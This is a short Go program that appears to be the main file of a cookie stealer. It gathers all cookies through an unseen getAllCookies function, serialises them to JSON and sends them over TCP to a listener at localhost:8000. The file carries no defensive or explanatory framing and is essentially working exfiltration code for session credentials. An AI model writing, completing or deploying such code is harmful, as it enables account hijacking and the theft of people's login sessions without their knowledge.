package main

import (
	"encoding/json"
	"log"
	"net"
)

func main() {
	cookies := getAllCookies()

	// convert cookies to json bytes
	jsonBytes, err := json.Marshal(cookies)
	if err != nil {
		log.Fatalf("[*] Error marshalling cookies: %v", err)
	}

	// send json bytes to listener
	conn, err := net.Dial("tcp", "localhost:8000")
	if err != nil {
		log.Fatalf("[*] Error dialing listener: %v", err)
	}

	_, err = conn.Write(jsonBytes)
	if err != nil {
		log.Fatalf("[*] Error writing to listener: %v", err)
	}
}
